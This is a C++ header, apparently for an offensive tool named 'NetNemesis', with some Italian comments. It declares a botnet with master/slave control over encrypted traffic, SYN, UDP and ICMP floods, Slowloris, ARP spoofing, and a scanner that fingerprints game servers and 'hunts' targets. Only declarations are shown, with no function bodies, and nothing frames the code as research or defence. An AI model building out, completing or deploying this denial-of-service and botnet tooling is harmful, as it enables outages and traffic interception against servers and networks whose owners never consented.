#ifndef NETNEMESIS_H
#define NETNEMESIS_H

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <queue>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/types.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

#define PACKET_SIZE 4096
#define DEFAULT_BOTNET_PORT 6666
#define AES_KEY_SIZE 32
#define AES_IV_SIZE 16

extern std::atomic<bool> g_running;
extern std::atomic<bool> g_is_master;
extern std::atomic<bool> g_is_slave;
extern std::atomic<bool> g_auto_hunt;
extern std::atomic<bool> scanner_running;
extern std::mutex g_print_mutex;

bool checkRoot();

// ========== SERVICE FINGERPRINTING ==========
class ServiceFingerprinter {
public:
    struct ServiceInfo {
        std::string name;
        std::string version;
        std::string extra_info;
    };
    
    ServiceInfo fingerprint(const std::string &ip, int port);
    std::string grabBanner(const std::string &ip, int port, double timeout = 2.0);
    ServiceInfo parseMinecraftResponse(const std::string &data);
    ServiceInfo parseSourceEngineResponse(const std::string &data);
};

// ========== CRITTOGRAFIA BOTNET ==========
class CryptoManager {
private:
    unsigned char key[AES_KEY_SIZE];
    unsigned char iv[AES_IV_SIZE];
    
public:
    CryptoManager();
    void deriveKey(const std::string &password);
    std::string encrypt(const std::string &plaintext);
    std::string decrypt(const std::string &ciphertext);
    std::string base64Encode(const unsigned char *data, int len);
    std::vector<unsigned char> base64Decode(const std::string &encoded);
};

// ========== ICMP FLOOD ==========
class ICMPFlooder {
private:
    int raw_socket;
    unsigned short calculateChecksum(unsigned short *buf, int nwords);
    
public:
    ICMPFlooder();
    ~ICMPFlooder();
    bool initialize();
    void flood(const std::string &target, int packets = 10000, int rate = 1000);
};

// ========== ARP SPOOFING ==========
class ArpSpoofer {
private:
    int raw_socket;
    std::string interface;
    std::thread poison_thread;
    bool running;
    
    void sendArpPacket(const std::string &src_ip, const std::string &src_mac,
                       const std::string &dst_ip, const std::string &dst_mac,
                       bool is_reply);
    void poisonLoop(const std::string &target_ip, const std::string &gateway_ip);
    
public:
    ArpSpoofer();
    ~ArpSpoofer();
    bool initialize(const std::string &iface);
    void startPoisoning(const std::string &target_ip, const std::string &gateway_ip);
    void stop();
};

// ========== SLOWLORIS ==========
class SlowlorisAttacker {
private:
    std::vector<int> connections;
    std::atomic<bool> running;
    std::thread maintainer_thread;
    
    void maintainConnections(const std::string &target, int port);
    
public:
    SlowlorisAttacker();
    ~SlowlorisAttacker();
    void attack(const std::string &target, int port, int num_connections = 1000);
    void stop();
};

// ========== CLASSI ESISTENTI ==========
class PacketCrafter {
private:
    int raw_socket;
    struct sockaddr_in dest_addr;
    unsigned short calculateChecksum(unsigned short *buf, int nwords);
    void buildIpHeader(struct iphdr *iph, int dest_ip, int packet_len);
    void buildTcpHeader(struct tcphdr *tcph, int src_port, int dest_port, int seq, int ack, int flags);
    
public:
    PacketCrafter();
    ~PacketCrafter();
    bool initialize();
    void sendSYNFlood(const std::string &target, int port, int packets);
    void sendUDPFlood(const std::string &target, int port, int packets);
};

class BotnetManager {
private:
    int master_socket;
    std::vector<int> slave_sockets;
    std::thread listener_thread;
    std::thread slave_thread;
    std::mutex slaves_mutex;
    std::string master_ip;
    int master_port;
    CryptoManager crypto;
    
    void masterListener();
    void slaveConnector();
    
public:
    BotnetManager();
    void startMaster(int port, const std::string &password = "");
    void startSlave(const std::string &ip, int port, const std::string &password = "");
    void broadcastToSlaves(const std::string &cmd);
    void stop();
    bool isMaster() const;
    bool isSlave() const;
};

class NetworkScanner {
private:
    std::thread scan_thread;
    std::vector<std::pair<std::string, int>> discovered_servers;
    std::vector<std::pair<std::string, int>> local_connections;
    std::mutex servers_mutex;
    std::mutex connections_mutex;
    ServiceFingerprinter fingerprinter;
    
    void scanLoop();
    bool probePort(const std::string &ip, int port);
    void scanRange(int start_host, int end_host, const std::vector<int> &ports, 
                   std::atomic<int> &progress, int total_hosts);
    std::vector<std::pair<std::string, int>> collectLocalConnections();
    std::vector<std::pair<std::string, int>> parseProcNetFile(const std::string &path);
    
public:
    NetworkScanner();
    void start();
    void stop();
    std::vector<std::pair<std::string, int>> getServers();
    std::vector<std::pair<std::string, int>> getConnections();
};

std::string getGameName(int port);

class AttackEngine {
private:
    PacketCrafter packet_crafter;
    ICMPFlooder icmp_flooder;
    SlowlorisAttacker slowloris;
    ArpSpoofer arp_spoofer;
    BotnetManager *botnet;
    
public:
    AttackEngine(BotnetManager *bm);
    void executeDOS(const std::string &target, int port, bool use_raw);
    void executeDDOS(const std::string &target, int port, int bots);
    void executeICMPFlood(const std::string &target, int packets);
    void executeSlowloris(const std::string &target, int port, int connections);
    void stopSlowloris();
    void executeARPSpoof(const std::string &target, const std::string &gateway);
    void executeHunt();
};

class NetNemesisCLI {
private:
    BotnetManager botnet;
    NetworkScanner scanner;
    AttackEngine attack_engine;
    
    void showBanner();
    void botnetInteractiveMenu();
    
public:
    NetNemesisCLI();
    void run();
};

namespace Utils {
    void logInfo(const std::string &msg);
    void logSuccess(const std::string &msg);
    void logError(const std::string &msg);
    void logWarning(const std::string &msg);
    void logAttack(const std::string &msg);
    void clearScreen();
    std::vector<std::string> split(const std::string &s, char delim);
    void animateAttack(const std::string &type, const std::string &target);
    std::string getMacAddress(const std::string &iface);
}

#endif